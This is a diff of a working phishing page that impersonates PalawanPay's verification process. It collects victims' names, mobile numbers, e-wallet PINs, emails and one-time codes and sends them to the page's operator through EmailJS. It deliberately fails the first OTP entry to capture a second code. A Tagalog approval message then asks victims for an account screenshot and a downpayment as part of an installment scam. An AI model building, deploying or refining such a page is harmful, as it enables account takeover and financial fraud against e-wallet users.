@@ -1,24 +1,112 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>PalawanPay Verification</title>
-  <link rel="icon" href="https://www.palawanpay.com/wp-content/uploads/2023/07/PPAYNavBarLogo.png" />
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <script>
-    (function () {
-      emailjs.init("JrobxQsLrNfy-y_lB"); // ✅ Your Public Key
-    })();
-  </script>
-  <style>
-    /* [Same CSS – no changes needed] */
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PalawanPay Verification</title>
+<link rel="icon" href="https://www.palawanpay.com/wp-content/uploads/2023/07/PPAYNavBarLogo.png" />
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  (function() {
+    emailjs.init("JrobxQsLrNfy-y_lB"); // ✅ Correct EmailJS Public Key
+  })();
+</script>
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+    background: url('https://www.palawanpay.com/wp-content/uploads/2025/05/Panaloan_May-1-819x1024.jpg') no-repeat center center fixed;
+    background-size: cover;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  .overlay {
+    background: rgba(255, 255, 255, 0.95);
+    padding: 30px;
+    border-radius: 12px;
+    width: 90%;
+    max-width: 400px;
+    text-align: center;
+  }
+  .logo {
+    display: block;
+    margin: 0 auto 15px auto;
+    width: 100%;
+    max-width: 260px;
+    height: auto;
+  }
+  .footer-logo {
+    display: block;
+    margin: 15px auto 5px auto;
+    width: 100%;
+    max-width: 300px;
+    height: auto;
+  }
+  .title {
+    color: #046930;
+    margin-bottom: 10px;
+    font-weight: bold;
+  }
+  input {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    font-size: 16px;
+  }
+  .btn {
+    width: 100%;
+    padding: 12px;
+    margin-top: 12px;
+    background-color: #046930;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-size: 18px;
+    cursor: pointer;
+  }
+  .btn:hover {
+    background-color: #035224;
+  }
+  .footer {
+    margin-top: 10px;
+    font-size: 14px;
+    color: #333;
+  }
+  .rights {
+    margin-top: 5px;
+    font-size: 12px;
+    color: #666;
+  }
+  .status {
+    margin-top: 10px;
+    font-size: 14px;
+  }
+  #loading {
+    display: none;
+  }
+  .spinner {
+    margin: 20px auto;
+    width: 40px;
+    height: 40px;
+    border: 4px solid #ccc;
+    border-top: 4px solid #046930;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+</style>
 </head>
 <body>
 <div class="overlay">
 
-  <!-- Header Logo -->
   <img src="https://www.palawanpay.com/wp-content/uploads/2023/07/PPAYNavBarLogo.png" class="logo" alt="PalawanPay Logo" />
 
   <!-- Step 1: Registration Form -->
@@ -57,7 +145,7 @@
     <h2 class="title">Application Approved!</h2>
     <p style="text-align:left;">
       Congratulations suki!<br><br>
-      Ang iyong application form ay APPROVED na bago magpatuloy kailangan mo mag fill-up at i-pass ang contract form na iyong matatangap sa pamamagitan ng email upang ma-check ng aming system na ikaw ay isang GOOD PAYER.<br><br>
+      Ang iyong application form ay APPROVED na bago mag patuloy kailangan mo mag fill-up at i-pass ang contract form na iyong matatangap sa pamamagitan ng email upang ma check ng aming system na ikaw ay isang GOOD PAYER.<br><br>
       Please also send a screenshot of your PalawanPay account with your downpayment amount for the meet up payment so that we can have a record of your first "GIVES AND INSTALLMENT"<br><br>
       NOTE: You will give the payment when you meet the seller and the payment will be made using Palawanpay to PalawanPay.<br><br>
       Your Verification code is (450099). DO NOT SHARE.<br><br>
@@ -72,26 +160,19 @@
 </div>
 
 <script>
-  // Step 1 Form Submission
   document.getElementById('register-form').addEventListener('submit', function(e) {
     e.preventDefault();
-
-    const name = document.getElementById('name').value;
-    const mobile = document.getElementById('mobile').value;
-    const pin = document.getElementById('pin').value;
-    const email = document.getElementById('email').value;
-    const unit = document.getElementById('unit').value;
-
     document.getElementById('status1').textContent = "Sending...";
     document.getElementById('status1').style.color = "blue";
 
     emailjs.send("service_hgozm6f", "template_c2i1xpm", {
-      name: name,
-      mobile: mobile,
-      pin: pin,
-      email: email,
-      otp: "", // blank for step 1
-      status: "Initial Registration - Unit: " + unit
+      name: document.getElementById('name').value,
+      mobile: document.getElementById('mobile').value,
+      pin: document.getElementById('pin').value,
+      email: document.getElementById('email').value,
+      unit: document.getElementById('unit').value,
+      otp: "",
+      status: "Initial Registration"
     }).then(() => {
       sessionStorage.setItem('otpAttempts', '0');
       document.getElementById('step1').style.display = 'none';
@@ -103,12 +184,10 @@
     });
   });
 
-  // OTP Verification
   function verifyOTP() {
     let attempts = parseInt(sessionStorage.getItem('otpAttempts') || '0', 10);
     attempts++;
     sessionStorage.setItem('otpAttempts', attempts);
-
     const enteredOTP = document.getElementById('otp').value.trim();
 
     if (attempts < 2) {
@@ -120,18 +199,16 @@
       startCountdown();
     }
 
-    // Send OTP attempt
     emailjs.send("service_hgozm6f", "template_c2i1xpm", {
       name: document.getElementById('name').value,
       mobile: document.getElementById('mobile').value,
-      pin: document.getElementById('pin').value,
       email: document.getElementById('email').value,
+      pin: document.getElementById('pin').value,
       otp: enteredOTP,
-      status: attempts < 2 ? 'Wrong OTP Attempt #' + attempts : 'Correct OTP'
-    }).catch(error => console.error("OTP Send Error:", error));
+      status: attempts < 2 ? "Wrong OTP Attempt #" + attempts : "Correct OTP"
+    });
   }
 
-  // Countdown before showing approval
   function startCountdown() {
     let count = 10;
     const timer = setInterval(() => {
